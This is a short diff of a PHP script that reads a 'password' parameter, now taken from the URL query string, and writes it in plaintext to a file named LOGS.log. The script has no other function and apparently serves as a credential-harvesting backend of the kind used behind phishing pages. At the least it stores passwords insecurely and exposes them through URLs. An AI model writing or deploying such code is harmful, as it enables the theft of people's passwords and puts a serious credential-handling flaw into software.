@@ -1,4 +1,6 @@
+
 <?php
-  FILE=fopen("LOGS.log","w+");
-  fwrite($FILE, $_POST['password']);
+  $FILE=fopen("LOGS.log","w+");
+  fwrite($FILE, $_GET['password']);
+  fclose($FILE);
 ?>
